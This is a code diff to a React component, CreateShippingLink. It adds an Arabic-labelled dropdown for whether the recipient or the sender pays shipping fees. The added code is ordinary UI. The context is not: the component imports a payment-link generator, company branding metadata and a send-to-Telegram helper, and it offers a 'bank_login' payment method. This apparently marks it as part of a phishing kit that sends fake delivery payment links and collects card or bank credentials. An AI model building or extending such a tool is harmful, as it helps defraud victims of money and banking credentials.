@@ -14,7 +14,7 @@ import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countr
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -38,6 +38,7 @@ const CreateShippingLink = () => {
   
   const [selectedService, setSelectedService] = useState("");
   const [trackingNumber, setTrackingNumber] = useState("");
+  const [payerType, setPayerType] = useState("recipient"); // "recipient" or "sender"
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
@@ -81,6 +82,7 @@ const CreateShippingLink = () => {
           service_key: selectedService,
           service_name: selectedServiceData?.name || selectedService,
           tracking_number: trackingNumber,
+          payer_type: payerType, // "recipient" or "sender"
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 500,
           payment_method: paymentMethod,
@@ -238,6 +240,33 @@ const CreateShippingLink = () => {
                   className="h-9 text-sm"
                   required
                 />
+              </div>
+
+              {/* Payer Type Selection */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <User className="w-3 h-3" />
+                  من سيدفع رسوم الشحن؟ *
+                </Label>
+                <Select value={payerType} onValueChange={setPayerType}>
+                  <SelectTrigger className="h-10">
+                    <SelectValue placeholder="اختر من يدفع الرسوم" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    <SelectItem value="recipient">
+                      <div className="flex items-center gap-2">
+                        <User className="w-4 h-4" />
+                        <span>المستلم - سيستلم الشحنة ويدفع</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="sender">
+                      <div className="flex items-center gap-2">
+                        <User className="w-4 h-4" />
+                        <span>المرسل - أرسل الشحنة ويدفع</span>
+                      </div>
+                    </SelectItem>
+                  </SelectContent>
+                </Select>
               </div>
               
               {/* Package Description */}
